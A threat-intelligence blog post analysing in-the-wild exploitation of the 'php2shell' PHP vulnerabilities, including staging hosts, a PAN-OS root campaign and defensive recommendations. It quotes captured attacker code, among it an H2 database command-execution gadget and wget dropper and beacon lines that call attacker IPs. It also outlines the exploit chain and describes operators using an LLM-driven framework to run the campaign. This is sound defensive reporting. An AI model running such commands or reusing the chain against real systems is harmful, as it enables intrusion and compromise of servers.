---
title: "PHP2Shell One Week Later: Honeypot Shells on the Web, a Path to Root on Palo Alto Firewalls"
url: https://hunt.io/blog/php2shell-honeypot-shells-root-palo-alto-firewalls
hostname: hunt.io
description: One week after php2shell was patched, it stalls on the open web but reliably roots internet-facing Palo Alto PAN-OS firewalls. Inside the operators and the evidence.
sitename: Hunt Intelligence
date: "2026-10-28"
fingerprint: f7d930d3cea207c3
---
# PHP2Shell One Week Later: Honeypot Shells on the Web, a Path to Root on Palo Alto Firewalls

Published on

PHP2Shell emerged from two critical PHP memory-safety vulnerabilities, [CVE-2026-109618](https://portal.hunt.io/vulnerability/cve/CVE-2026-109618) and [CVE-2026-109619](https://portal.hunt.io/vulnerability/cve/CVE-2026-109619), rated CVSS 4.0 9.2 and patched on October 21, 2026. The flaws affect how PHP handles session uploads and out-of-memory conditions, creating a path to remote code execution under vulnerable configurations.

We already covered the exposure side on 2026-10-22, [mapping roughly 3.19 million internet-facing PHP hosts and the first open directories](https://hunt.io/blog/php2shell-cve-2026-109618-109619-open-directories) staging php2shell tooling. This report goes the other way. We take the public exploitation reports from watchTowr, 0x4D31, GreyNoise, Wiz, and CrowdStrike and pivot back into our [AttackCapture™](https://hunt.io/features/attackcapture) open-directory data to see who is running this, how operators are adapting it, and how far it has really gone. We separate confirmed php2shell compromise from tooling, attempted attacks, and compromises that turned out to use a different bug.

Our continued AttackCapture™ investigation identified additional exploit infrastructure, including a host at 130.94.67\[.\]235 (IP previously undisclosed) serving a proof of concept that repackages the PHP exploit chain for PAN-OS. Separately, [Dream Research](https://dreamgroup.com/blog/chained-php2shell-exploit-roots-25-servers) reported a campaign in which attackers chained PHP2Shell with the Fragnesia Linux kernel privilege-escalation vulnerability (CVE-2026-46300) to obtain root access on 25 servers. Unit 42 subsequently reported that it [verified](https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/) the same attacker's tooling and the reported results.

## Key findings

- Our open-directory hunt uncovered 616 PHP2Shell-related files, revealing a broad ecosystem of exploit development and staging infrastructure.
- We found shared exploit kits, cloned PoCs, custom heap exploits, scanners, and post-exploitation tooling across multiple hosts.
- A shared ASLR-bypass kit was byte-identical across four hosts, with lab logs confirming execution as www-data.
- Shells have been confirmed only on honeypots and sensors by watchTowr, 0x4D31, and GreyNoise. Wiz and CrowdStrike found none. On the open internet, there is still no evidence of reliable mass compromise, but php2shell has been used to root internet-facing PAN-OS firewalls, the first confirmed production compromises.
- In one capture, an operator ran php2shell against a national government, got only a crash, and then broke in with a different bug.
- A PAN-OS-focused repackaging was exposed at 130.94.67\[.\]235. Files including panos\_rce\_poc.py and prce.py show adaptation of the PHP2Shell technique for a firewall-management environment.
- Operators stage these kits against hand-picked, high-value targets: a government finance ministry, a national bank, a government e-invoicing platform, telecom, and university systems.
- One operator wrote its own heap exploit and ships a log cleaner, which is more effort than running a public PoC.

## PHP2Shell: The Vulnerability and Exploitation Chain

[PHP's own advisories](https://www.php.net/archive/2026.php#2026-10-21-5) describe CVE-2026-109618 and CVE-2026-109619 as two related memory-safety bugs in PHP core. Both are rated CVSS v4.0 9.2 and fixed in PHP 8.2.35, 8.3.36, 8.4.27, and 8.5.12.

1. CVE-2026-109618 (GHSA-w8hw-w9fx-j79w) is a use-after-free reachable when PHP's old out-of-memory path calls longjmp() to abort a request without accounting for memory that was only partially set up, so the later request-cleanup step reads or branches on invalid state.
2. CVE-2026-109619 (GHSA-6wmf-4rv5-p3rp) is a related use-after-free where global state that should point into request memory is not reset correctly and can be read across requests after that memory is freed.

A third tracking entry, [CVE-2026-115560](https://www.php.net/archive/2026.php#2026-10-23-1), was opened on October 23 after the leak with no technical detail of its own. Its only [public guidance, from cPanel](https://support.cpanel.net/hc/en-us/articles/44488655369367-PHP-Security-Release-CVE-2026-115560), is to disable **session.upload\_progress** as a stopgap, which is the same mitigation the original advisories point to.

**session.upload\_progress**, on by default in PHP since version 5.4, is the practical way in. During a multipart upload, it writes progress data, including an attacker-controlled key, into the session file before the request finishes initializing, which is why it sits at the center of nearly every proof of concept we pulled from open directories.

The [full chain one operator's own tooling documents](https://qideng.substack.com/p/php2shell-dissecting-phps-critical) in detail uses that entry point to corrupt the Zend memory allocator, leak the libphp base address to defeat ASLR, then forge a destructor pointer so a later free calls system(). A [publicly staged README spells out the three stages almost exactly as PHP's advisory](https://github.com/ikow/php2shell-poc/blob/main/README.md) describes the underlying bug class:

1. **Heap groom**. An out-of-bounds read leaks the Zend memory-manager chunk base.
2. **libphp leak**. A forged zend\_string length exposes the destructor pointer and the libphp base, defeating ASLR.
3. Remote code execution, by forcing a call through the forged pointer.

If the target already has a local file inclusion bug, an operator can skip the heap work entirely, write PHP code into the session file through session.upload\_progress, then include that file through the existing LFI. One tool we pulled calls this step **chain\_a\_session\_lfi.py**, and its documentation is explicit that it needs nothing disabled on a stock install, only an existing include bug to reach the planted code.

Reliability remains the key limitation, as triggering a use-after-free does not guarantee control over subsequent memory access. The address-leak stage also depends heavily on PHP's build, memory limits, and worker model, with frequent memory exhaustion distinguishing attempted exploitation from reliably demonstrated success.

## PHP2Shell Exploitation in the Wild: What the Evidence Shows

Public reporting doesn't fully agree, and the split that matters is simple: who observed exploitation, and who looked and saw none.

- [0x4D31](https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-confirmed-rce.md) (Adel Karimi) ran PHP 8.4.26 honeypots and logged 32 shells from [162.35.99\[.\]94](https://portal.hunt.io/ip/162.35.99.94) across three targets, plus 3 from [15.204.59\[.\]70](https://portal.hunt.io/ip/15.204.59.70), on 2026-10-24. The signal he trusted was an Apache worker spawning a shell, not an HTTP 200. He also flagged his test as a single-worker setup, which is kind to the exploit.
- [GreyNoise](https://php.events.greynoise.io/) logged 5 shells from [2.59.133\[.\]151](https://portal.hunt.io/ip/2.59.133.151) on 2026-10-28 and 10-29, again apache2 spawning sh. The spawned shell ran a curl to an integer-encoded version of the attacker's own IP, then sleep 5.
- [Wiz](https://www.wiz.io/blog/php2shell-exploitation-so-far) published on 2026-10-27 and took the other side. Its attempts mostly triggered memory exhaustion and failed the address leak, and it saw no end-to-end success in its own telemetry. It credited the honeypot result but called it a favorable configuration.
- [CrowdStrike](https://www.crowdstrike.com/en-us/blog/obstacles-to-weaponizing-php2shell-likely-constrain-exploitation/) reached the same conclusion on 2026-10-23: no exploitation in the wild or in its own honeypots, only testing and failed attempts, and no public exploit it judged good enough for widespread use.

So **three** independent honeypot networks confirm the bug works in some conditions, while **two** major vendors looked and saw nothing land. **watchTowr** [reported](https://watchtowr.com/intelligence/php-remote-code-execution-php2shell/) exploitation of both CVEs on its Attacker Eye honeypots on 2026-10-21, the earliest of the three, alongside the shells 0x4D31 and GreyNoise logged. **None of these honeypot results show it reliably compromising arbitrary production servers, and every vantage point in this section is a honeypot or a sensor. The confirmed production compromises are against PAN-OS, covered below.**

Several other firms, including **Tenable**, **Sophos**, **Zscaler**, **Elastic**, and **Tanium**, published advisories and detection guidance but reported no exploitation of their own. This is the public reporting available as of October 30, not necessarily a complete record.

The earliest careful assessment said the same thing. On 2026-10-21, the day the fixes landed and before the week of alarm, Daniel Card at PwnDefend [weighed how likely mass exploitation really was](https://www.pwndefend.com/2026/10/21/how-likely-is-mass-exploitation-of-php2shell/) and called it a high-alert but not-yet-active scenario: mass denial of service and memory disclosure were the probable outcomes, while reliable RCE would stay tied to specific stacks (SAPI, memory\_limit, architecture). That held for the open internet. It did not hold for uniform appliance stacks. php2shell has since been used to root internet-facing PAN-OS firewalls, the stack-specific reliable RCE Card identified as the real risk.

The three IPs behind those confirmed shells are below.

### Confirmed shells on honeypots and sensors

| IP | Host / ASN | Country | Reported by | Notes | 
|---|---|---|---|---|
| [162.35.99\[.\]94](https://portal.hunt.io/ip/162.35.99.94) | InterServer (AS19318) | US | 0x4D31, Wiz | 32 shells; also stages a separate Metabase/H2 RCE on :8090 | 
| [15.204.59\[.\]70](https://portal.hunt.io/ip/15.204.59.70) | OVH | US | 0x4D31, Wiz | 3 shells; opendir on :81 with an sh dropper and integer-IP beacon | 
| [2.59.133\[.\]151](https://portal.hunt.io/ip/2.59.133.151) | dataforest GmbH (AS58212) | DE | GreyNoise | 5 shells; boundaries ----lf and ----rceStock, which we do not see in our data | 

To pull these up, search each IP in [AttackCapture™](https://hunt.io/features/attackcapture), or run the open-directory query from our Query Playbook:

```
SELECT
  file_url,
  file_name
FROM
  open_directories
WHERE
  ip = '162.35.99.94'
  OR ip = '15.204.59.70'
  OR ip = '2.59.133.151'
GROUP BY
  file_url,
  file_name
```
                Copy
Output example:

Figure 1. A HuntSQL query to find filenames exposed through open directories across three IP addresses, 162.35.99\[.\]94, 15.204.59\[.\]70, and 2.59.133\[.\]151.
The [query](https://portal.hunt.io/sql?sql=SELECT%0A++file_url%2C%0A++file_name%0AFROM%0A++open_directories%0AWHERE%0A++ip+%3D+%27162.35.99.94%27%0A++OR+ip+%3D+%2715.204.59.70%27%0A++OR+ip+%3D+%272.59.133.151%27%0AGROUP+BY%0A++file_url%2C%0A++file_name&run=true&page=0&size=25&sizeWasCapped=false&hl=true&ec=true&tf=30&hasExplicitTimeframe=false&tab=results) returned **107 events** since September 29, 2026, indicating repeated activity involving **five distinct file URLs** across the observed timeframe. The files include a SQL proof of concept, HTTP logs, and several numbered or versioned resources.

On [162.35.99\[.\]94](https://portal.hunt.io/ip/162.35.99.94), the open directory on :8090 is not php2shell at all. It is an H2 database RCE gadget aimed at Metabase, a different tool the same host happens to run:

```
CREATE ALIAS IF NOT EXISTS EXEC AS 'void run(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(new String[]{"bash","-c",cmd}); }';
CALL EXEC('curl -s -m 5 http://162.35.99[.]94:8090/metabase-rce-139.162.86[.]33');
```
                Copy
On [15.204.59\[.\]70](https://portal.hunt.io/ip/15.204.59.70), the open directory holds the second-stage dropper and a beacon that calls home to an integer-encoded form of its own IP:

```
# identify, beacon, second-stage pull over wget/curl, self-contained
wget -q -O /tmp/.s2 "http://15.204.59[.]70:81/s2"
# beacon back, integer-IP http, no SNI
wget -q -O /dev/null "http://265042758:81/b?..."
```
                Copy
## Mapping the PHP2Shell Exploit Infrastructure

The public reports show where shells landed. They do not show the tooling behind them, and that is what our open-directory data maps next. The hunting methodology began with three confirmed IPs and publicly reported file artifacts as initial indicators. **AttackCapture™ Code Search** was used to search indexed open-directory file contents for key strings, including **session.upload\_progress** and the relevant CVE identifiers, identifying [616 matching files](https://portal.hunt.io/attackcapture/code-search?q=%22%5C%22session.upload_progress%5C%22%22&run=true) as of October 30.

**HuntSQL's open\_directories** table was used to validate timestamps and host activity, while IP enrichment provided ASN, hosting provider, and country details for infrastructure attribution.

**Note**: An exposed toolkit on an open directory proves the tooling is present, not that any given target was hit.

| Host:port | Role | Key files | New here | 
|---|---|---|---|
| [208.115.245\[.\]98](https://portal.hunt.io/attackcapture/filemanager?host=http://208.115.245.98:8088) / .99 / .102 :8088 | Toolkit staging cluster, cloned PoCs plus a running copy | php2shell\_dl/ (ikow, mnk-works, murrez, zr0n), p2s\_run/poc.py 535b9e29 | Yes | 
| [185.242.106\[.\]140:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://185.242.106.140:8000) | Operational toolkit | vcript.py, sc.py heap RCE, scanners, vcsu7 log cleaner | Yes | 
| [45.39.190\[.\]176:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://45.39.190.176:8000) | Dev/build box plus a Moodle workspace | chain\_a\_session\_lfi.py (= vcript.py), compiled PHP 8.4.15 | Yes | 
| 130.94.67\[.\]235 ( [:80](https://portal.hunt.io/attackcapture/filemanager?host=http://130.94.67.235), [:8080](https://portal.hunt.io/attackcapture/filemanager?host=http://130.94.67.235:8080)) | Same bug repackaged for PAN-OS | panos\_rce\_poc.py / prce.py 1c93ea48 | Yes | 
| [45.83.180\[.\]113:19001](https://portal.hunt.io/attackcapture/filemanager?host=http://45.83.180.113:19001) | php2shell IoC/kit tracker | php2shell\_watch\_report.txt | Yes | 
| [15.204.59\[.\]70:81](https://portal.hunt.io/attackcapture/filemanager?host=http://15.204.59.70:81) | Post-exploitation staging | s2 dropper, s2\_new integer-IP beacon | Contents new | 
| 85.121.179\[.\]129 ( [:53](https://portal.hunt.io/attackcapture/filemanager?host=http://85.121.179.129:53), [:80](https://portal.hunt.io/attackcapture/filemanager?host=http://85.121.179.129:80), [:443](https://portal.hunt.io/attackcapture/filemanager?host=http://85.121.179.129:443)) | Exploit-development host | php2shell-bypass-aslr-exp tree; cmd\*.log info-leak | Yes | 
| [34.146.20\[.\]31](https://portal.hunt.io/attackcapture/filemanager?host=http://34.146.20.31:8181) / [38.60.136\[.\]217](https://portal.hunt.io/attackcapture/filemanager?host=http://38.60.136.217:8111) / [96.126.130\[.\]81](https://portal.hunt.io/attackcapture/filemanager?host=http://96.126.130.81:9999) / [101.133.233\[.\]159](https://portal.hunt.io/attackcapture/filemanager?host=http://101.133.233.159:8080) | Shared 9bie kit, lab RCE to www-data | php2shell-bypass-aslr-exp (byte-identical), poc\_109618.py | Yes | 
| [130.12.180\[.\]89:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://130.12.180.89:8000) | php2shell attempted, failed; pivoted to a web-framework RCE | p2s\_run.py, php2shell\_\*.log (RCE unreachable) | Yes | 
| [198.41.83\[.\]165:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://198.41.83.165:8000) / [198.41.83\[.\]174:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://198.41.83.174:8000) | Shared operator, php2shell plus password-cracking and scanning | p2s\_exp.py, identical SHA-256 8e655357b2... on both hosts, alongside hydra and nuclei | Yes | 
| [18.136.195\[.\]202:8888](https://portal.hunt.io/attackcapture/filemanager?host=http://18.136.195.202:8888) | Public PoC with a bundled ModSecurity detection rule | cve-2026-109618-php2shell/README.md, modsecurity-php2shell.conf | Yes | 
| [95.41.54\[.\]130:80](https://portal.hunt.io/attackcapture/filemanager?host=http://95.41.54.130:80) | Operator workstation running an AI offensive framework that tests php2shell among other bugs | ARTEX-main/ transcripts, alongside evilginx2 and cloud-attack tooling unrelated to php2shell | Yes | 

To sum up, we have mapped some of the open directories in multiple categories.

Figure 5. The php2shell staging servers we captured, grouped by operator. The same 9bie ASLR-bypass kit is byte-identical across four of them, lab-proven to reach www-data. This shared kit has not been observed landing on a live victim; the confirmed PAN-OS compromises trace to a separate operator.
The kits behind these files group into a few distinct operators.

### Inside the Operators' Exploit Toolkits

Our analysis found multiple groups running the same bug through different kits. One pattern, a single kit shared across many more operators, is covered separately below.

We have found a cluster of three open directories hosted at [208.115.245\[.\]98](https://portal.hunt.io/ip/208.115.245.98), [208.115.245\[.\]99](https://portal.hunt.io/ip/208.115.245.99), and [208.115.245\[.\]102](https://portal.hunt.io/ip/208.115.245.102), on port 8088 with the same layout. Each serves a php2shell\_dl/ folder of cloned public repos and a live copy under p2s\_run/. The running poc.py is identical on all three, which is what ties them together.

One cloned README states the target plainly: an automated php2shell exploit for CVE-2026-109618 and CVE-2026-109619, unauthenticated RCE in the PHP engine through session.upload\_progress heap corruption.

Figure 6. README for the 'php2shell' exploit (CVE-2026-109618/109619) that contains vulnerability explanation, exploitation chain, usage examples, offset-resolution methods, mitigation guidance, and references to related GitHub projects and research.
The second example pairs two open directories hosted at [185.242.106\[.\]140](https://portal.hunt.io/attackcapture/filemanager?host=http://185.242.106.140:8000) and [45.39.190\[.\]176](https://portal.hunt.io/attackcapture/filemanager?host=http://45.39.190.176:8000). Our analysis found two exploits with a byte-identical core: **vcript.py** on one and **chain\_a\_session\_lfi.py** on the other, and both import the same helper whose docstring reads, "Shared utilities for php2shell exploits."

This operator runs **two** techniques in parallel: the **session-injection LFI chain** and a **hand-written heap exploit** with hardcoded offsets for a specific PHP 8.4.26 Apache build. It also ships a utmp and wtmp log cleaner, which tells us it expects interactive shells on hosts it actually hits. Output comes back in the HTTP response directly, so there is no separate command-and-control channel to find.

### The exception that landed: Palo Alto PAN-OS firewalls rooted

This is the most important finding in this report, and it is not one more operator in the list above. On the open internet php2shell mostly dies in memory exhaustion. Palo Alto PAN-OS management is the exception, because it runs one uniform PHP 8.0.30 build across every unpatched box, which turns the unreliable heap chain into a calibratable, repeatable exploit.

We identified an exposed open directory at [130.94.67\[.\]235](https://portal.hunt.io/attackcapture/filemanager?host=http://130.94.67.235:8080) hosting a PAN-OS-focused adaptation of the PHP2Shell exploit chain. The directory contains two relevant files, panos\_rce\_poc.py and prce.py, indicating that the operator had adapted the PHP memory-corruption vulnerability for a different attack surface: Palo Alto Networks PAN-OS firewall management interfaces.

This is the first confirmed real-world php2shell compromise we can point to, and subsequent research by Dream Research [documented](https://dreamgroup.com/blog/chained-php2shell-exploit-roots-25-servers) an active exploitation campaign using a custom PHP2Shell implementation specifically developed and tailored for PAN-OS.

In its investigation, published on October 26 and updated October 29, Dream Research detailed how an attacker combined **CVE-2026-109618** and **CVE-2026-109619 (PHP2Shell)** with **[CVE-2026-46300 (Fragnesia)](https://nvd.nist.gov/vuln/detail/cve-2026-46300)**, a Linux kernel privilege-escalation vulnerability. The first exploit provided unauthenticated remote code execution through PHP's session.upload\_progress mechanism on the PAN-OS management web server (appweb).

The attacker then used Fragnesia to escalate privileges from the web-server execution context to root. The PHP2Shell implementation was a custom, non-public exploit rather than a copy of an existing public proof of concept. It was specifically adapted to PAN-OS and used version-dependent memory offsets and carefully calibrated heap layouts.

The attacker identified approximately 19,000 internet-facing PAN-OS firewalls, fingerprinted around 5,000 responsive devices, and narrowed the list to 240 targets matching the required geographic and software-version profiles. The automated exploitation campaign successfully rooted 24 firewalls initially. The attacker subsequently prioritized systems associated with a US government-affiliated environment, establishing a persistent reverse SSH tunnel into its internal network and exploiting an additional internal firewall management server. This brought the total to 25 compromised servers.

The operator did not run this by hand. The same directory held aiscan, an autonomous reconnaissance and scanning framework wired to two large language models, DeepSeek as its primary driver and Kimi for vision tasks such as reading captured screenshots, with target discovery handled by the FOFA search engine rather than a model. Claude Code was also present on the host.

Figure 10. AttackCapture™ showing the operator’s aiscan.yaml, API key redacted. The provider fields (openai, anthropic) and the “Kimi (Anthropic)” note are API-compatibility labels, not the vendors; the base\_url and model lines name the real services, DeepSeek and Kimi.
The operator's own instructions to the agent, recovered from its session logs, are written in Chinese. What the AI layer does here is orchestrate the campaign: it drives discovery, triage, and the scan-and-verify loop behind the target selection that pared roughly 19,000 firewalls down to a few hundred worth attacking.

The exploit itself, the php2shell and Fragnesia chain with its per-build memory offsets, is hand-calibrated work, and nothing in the capture shows a model writing it. The shift worth noting is not that AI built the exploit, but that it ran the operation around it, turning a hand-made chain into an automated, repeatable campaign.

Given its significance, we are covering this PAN-OS campaign in a dedicated analysis of its own.

### More operators and public PoCs

Another pair hosted at [198.41.83\[.\]165](https://portal.hunt.io/attackcapture/filemanager?host=http://198.41.83.165:8000) and [198.41.83\[.\]174](https://portal.hunt.io/attackcapture/filemanager?host=http://198.41.83.174:8000) on port 8000, hosted on the same network (VINAKOM COMMUNICATIONS, AS36327, US), runs an identical **php2shell exploit script** (p2s\_exp.py) alongside Hydra for password attacks and Nuclei for broader scanning.

One of the two hosts also exposed a leaked **Google Gemini API** key in plaintext, picked up by our automated secret scanning. The exploit script itself is a careful, documented implementation of the **session-poisoning-plus-LFI chain**, built to work against a stock PHP install with session.upload\_progress on, cleanup on, and no server-side setting disabled, as long as an existing local file inclusion is available to trigger the include.

A separate host, [18.136.195\[.\]202](https://portal.hunt.io/attackcapture/filemanager?host=http://18.136.195.202:8888) on port 8888, hosted on AWS in Singapore, stages a cloned proof of concept whose README documents the same three-stage heap leak, libphp leak, and forged-destructor chain described above, matched almost word for word against the official GHSA advisory text for both CVEs.

**Note**: On names: the handles in the code, ikow, LordX, and Tr0y, are the authors of the public PoCs and the reused log cleaner. They are not the operators. Treat them as tool lineage, not attribution.

### An exploit still in development, with the hard part working

One more capture deserves separating from the operator clusters above. [85.121.179\[.\]129](https://portal.hunt.io/ip/85.121.179.129) (AS48753, AlexHost SRL, Chisinau, Moldova) is not a staging box running someone else's kit. It is an exploit-development tree, 4,768 files and about 620 MB, served open across ports 53, 80, and 443 and updated as recently as 2026-10-28 03:37 UTC. We first captured it on 2026-10-26.

After the analysis, we found the working notes of someone building the heap exploit, such as chunk-sweep and heap-grooming scripts, out-of-bounds probes, and dozens of timestamped run logs. Several of the research notes inside, written mostly in **Chinese**, work through PHP's own RINIT initialization order in detail, tracing exactly where in the request lifecycle the **session.upload\_progress** callback runs relative to PHP's normal startup, and using that timing to explain why some chains succeed and others only crash the worker.

One proof-of-concept script on the host, **sup\_poc.py**, documents a pure cross-request trigger for the bug with no application-level session code required at all, sending one request that forces an out-of-memory bailout after session initialization, then a second request that reads back the resulting state.

In the operator's own cmd5.log, that step is working:

```
leak 819208 ptrs 8762
B2 1 1.4s vl=384 n1=2000 n2=1990 name_len=10 rc=1 ptr=0x7fffa42f8000 ht=384 resp=229781 status='HTTP/1.1 200 OK'
```
                Copy
The ten-character name\_len is the same multipart-boundary tell we flag under detection. The HTTP 200 carries leaked heap pointers back to the operator, and the log resolves a base address from them. This is the first time in our own data we have caught the address-leak primitive succeeding against a real target instead of dying in memory exhaustion.

**Note**: The logs we reviewed reach a working leak, not confirmed command execution on a live production host, and the target it is aimed at is not one we can confirm from the capture.

### The same kit, many operators, deliberate targets

The Moldova workbench is not a one-off. The same ASLR-bypass tree, byte-identical by SHA-256, turns up across **four** more open directories captured between October 22 and October 27, [34.146.20\[.\]31](https://portal.hunt.io/attackcapture/filemanager?host=http://34.146.20.31:8181), [38.60.136\[.\]217](https://portal.hunt.io/attackcapture/filemanager?host=http://38.60.136.217:8111), [96.126.130\[.\]81](https://portal.hunt.io/attackcapture/filemanager?host=http://96.126.130.81:9999), and [101.133.233\[.\]159](https://portal.hunt.io/attackcapture/filemanager?host=http://101.133.233.159:8080). The exploit scripts, the leak tool (tools/aslr\_run.py), the lab configurations, and even the debugger logs match from host to host. This is one kit shared between operators, not several people independently building the same thing.

On those four hosts, the kit works in a lab. The operators' own logs record a shell running as the web server user against vulnerable PHP builds, 8.2.34 and 8.4.26, with the address-leak step solved, the same result read on the Moldova host. One log line states the proof outright: **uid=33(www-data) gid=33(www-data) groups=33(www-data)**. The capability is real, and it is spreading between operators who are not in the same group.

```
tools/aslr_run.py  sha256 5e99d6023dce...  identical on 34.146.20[.]31 - 38.60.136[.]217 - 101.133.233[.]159
from the kit's own notes:  PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
                Copy
The staging directories hold hand-picked targets: a government finance ministry in Central Africa, a national bank in a European microstate, a government e-invoicing platform in East Asia, a commercial and telecom group in Southeast Asia, and university and procurement systems in the Caucasus.

Figure 15. Where the operators aimed php2shell, by sector and region. These staged targets were not confirmed compromised by php2shell. Separately, php2shell was used to root internet-facing PAN-OS firewalls.
One capture shows what happens when the kit meets a target like that. On [130.12.180\[.\]89](https://portal.hunt.io/attackcapture/filemanager?host=http://130.12.180.89:8000), an operator ran the full **php2shell chain** (p2s\_run.py) against a **national government in Eastern Europe**, and it failed. The logs confirm that RCE was unsuccessful in the target configuration, with attempts resulting only in crashes and memory exhaustion. Session files remained outside the webroot, preventing execution.

The operator **ultimately gained access** by exploiting a separate server-side vulnerability, confirming that PHP2Shell was attempted against a **government target** but did not succeed.

```
the operator's own run log, target redacted:
count=1500  →  http-5xx
progress-upload: ok
[shell] не подтверждён   (sess_* вне webroot / не исполняется)
[СВОДКА] target=https://<gov>/  OOM=ДА   shell=НЕТ
```
                Copy
One of the operators we captured left an **AI assistant's session log** in an open directory. The transcript, in **Chinese**, works through the php2shell advisory and the public exploit, and ties into an AI-driven offensive workflow we have covered before. A small but concrete marker of where this is heading: the exploit research itself handed to an agent. Set the open directories beside the public reporting and the PAN-OS campaign, and the assessment follows.

## Assessment: PHP2Shell Has Moved Beyond Proofs of Concept

PHP2Shell's exploitation picture has changed materially. Our initial investigation documented a growing ecosystem of proof-of-concept exploits, shared toolkits, exploit-development environments, and operators attempting to turn PHP memory-corruption vulnerabilities into reliable remote code execution. At that stage, successful compromise of production systems remained difficult to establish from our own observations.

Subsequent reporting has raised the level of concern. Dream Research documented a campaign in which attackers chained PHP2Shell with the Fragnesia kernel privilege-escalation vulnerability to obtain root access on 25 servers. Unit 42 later reported independently verifying the same attacker's tooling and the reported results. These findings establish that the threat extends beyond experimental tooling and isolated honeypot observations.

For defenders, the priority is no longer simply to anticipate whether PHP2Shell might be weaponized. Successful exploitation has been reported, and chaining PHP2Shell with a privilege-escalation vulnerability demonstrates how an initial foothold can become a deeper infrastructure compromise. The recommendations that follow address both the PHP exploit and the escalation path behind it.

Recommendations

- Patch to PHP 8.2.35, 8.3.36, 8.4.27, or 8.5.12 depending on branch, closing CVE-2026-109618 and CVE-2026-109619 outright.
- Where patching has to wait, set session.upload\_progress.enabled = 0 in php.ini, the same stopgap cPanel shipped for CVE-2026-115560.
- Add a WAF or reverse proxy rule flagging multipart POST requests with no User-Agent, a boundary under roughly twelve characters, and an oversized PHPSESSID cookie.
- Add a host rule, auditd or EDR, alerting whenever an apache2 or php-fpm worker process spawns /bin/sh.
- Add an egress rule flagging Apache or php-fpm making outbound connections to a raw IP address with no SNI.
- Add a SIEM correlation rule for more than three multipart POSTs to the same PHP endpoint from one source within 60 seconds.
- Run a YARA rule for the kit's own markers, attacksessionid0001, \_\_PHP2SHELL\_PROBE, and php2shell-scan, across web server temp and upload directories.

## Indicators of Compromise

The indicators below are defanged. They cover the confirmed-shell sources, the staging and exploit-development hosts, and the file hashes behind the shared kit. The queries to reproduce them are in the detection section above.

| IP / host | ASN | Hosting provider | Country | Role | 
|---|---|---|---|---|
| 162.35.99\[.\]94 | AS19318 | Interserver | US | Confirmed source, honeypot shells | 
| 15.204.59\[.\]70 | AS16276 | OVH | US | Confirmed source, honeypot shells | 
| 2.59.133\[.\]151 | AS58212 | dataforest GmbH | DE | Confirmed source, GreyNoise | 
| 208.115.245\[.\]98:8088 | AS46475 | Limestone Networks | US | Staging cluster | 
| 208.115.245\[.\]99:8088 | AS46475 | Limestone Networks | US | Staging cluster | 
| 208.115.245\[.\]102:8088 | AS46475 | Limestone Networks | US | Staging cluster | 
| 185.242.106\[.\]140:8000 | AS42532 | SIA VEESP | LV | Operational toolkit | 
| 45.39.190\[.\]176:8000 | AS211273 | Cloud Software FZCO | HK | Dev/build box, Moodle victim | 
| 130.94.67\[.\]235:80,8080 | AS154177 | Light Node Limited | JP | PAN-OS repackage | 
| 45.83.180\[.\]113:19001 | AS62005 | BlueVPS | EE | IoC/kit tracker | 
| 15.204.59\[.\]70:81 | AS16276 | OVH | US | Post-exploitation staging | 
| 162.35.99\[.\]94:8090 | AS19318 | Interserver | US | Metabase/H2, separate exploit | 
| 85.121.179\[.\]129 | AS48753 | AlexHost SRL | MD | Exploit-development host; lab info-leak working | 
| 34.146.20\[.\]31 | AS396982 | Google LLC | JP | Shared 9bie kit, lab RCE | 
| 38.60.136\[.\]217 | AS154177 | Light Node Limited | FR | Shared 9bie kit, lab RCE | 
| 96.126.130\[.\]81 | AS149440 | Evoxt | JP | Shared 9bie kit (variant), lab RCE | 
| 101.133.233\[.\]159 | AS37963 | Alibaba Cloud | CN | Shared 9bie kit plus scanner | 
| 144.217.161\[.\]236 | AS16276 | OVH | CA | Staging; govt finance targets | 
| 152.42.245\[.\]8 | AS14061 | DigitalOcean | SG | Staging; commercial targets | 
| 23.27.25\[.\]75 | AS149440 | Evoxt | DE | Staging; education/commercial | 
| 130.12.180\[.\]89 | AS202412 | Omegatech | DE | php2shell attempted, failed; pivoted to other bug | 
| 45.225.135\[.\]53 | AS64107 | RACK SPHERE | NL | SMTP/XXE operator; php2shell scanner only | 

| File | SHA-256 | 
|---|---|
| murrez php2shell poc.py | 535b9e298defd3449ba2b10b9828925d3ce344872dcbd9470c0e8db20f0aae83 | 
| shared session-LFI exploit (vcript.py / chain\_a\_session\_lfi.py) | 6f84cc354b785157983efa8f4b674d2e1d6c3331017f29ff8d51bc43668d4b0f | 
| sc.py heap RCE | 2d692ee6dcb41c249c55881897b7dec0550b92963e07fccdb11ad655601977c3 | 
| python.py scanner | 66bcbc8c2b9d847a1e976e57972e10eac98e9b894cbf30510bff1e8d63efb81f | 
| panos\_rce\_poc.py | 1c93ea48fa7ff886a6d81e44869dd7962309e95d01c1561df362b0b18007a562 | 
| zr0n README | 9c15dc5a510bf2e8a16c846e61fa35c50ef733b72d4e47b6e8307498a398443c | 
| 162.35.99\[.\]94 poc.sql | 4a1502affa36d106d5374bf02cf777956eef651176ec8964b26ff90f103dd506 | 
| shared 9bie ASLR-bypass exploit (exploit.py, byte-identical across hosts) | c1e81cfbaf7e4cccad7d7f43c1a624b791ba1b7f1d176e224455138604837b4c | 
| 9bie kit leak tool (aslr\_run.py) | 5e99d6023dce9bb18d845a37fcdbc7ea574fdb20ab8d888ec54c695382d46036 | 

## Conclusion

Our investigation identified 616 files matching PHP2Shell-related indicators across indexed open directories, exposing a diverse ecosystem of exploit development, staging infrastructure, and operational tooling. We mapped multiple infrastructure clusters, identified shared exploit code across hosts, and traced how different operators were experimenting with the same vulnerabilities.

We found one exploit kit shared byte-for-byte across four hosts, with operator logs demonstrating successful command execution as www-data in laboratory environments. We also identified a separate PAN-OS-focused implementation at 130.94.67\[.\]235, showing how the vulnerability is being adapted to other products. We also found an operator attempting PHP2Shell against a government target, but its own logs recorded failed execution before the operator moved to a different vulnerability.

The evidence shows operators sharing tools, refining exploit chains, testing vulnerable configurations, and selecting high-value targets. It also shows that exploitation is highly dependent on the target environment, and that a working laboratory exploit does not automatically translate into reliable RCE on arbitrary production systems. Against a uniform stack like PAN-OS management, it translated into confirmed root on internet-facing firewalls.

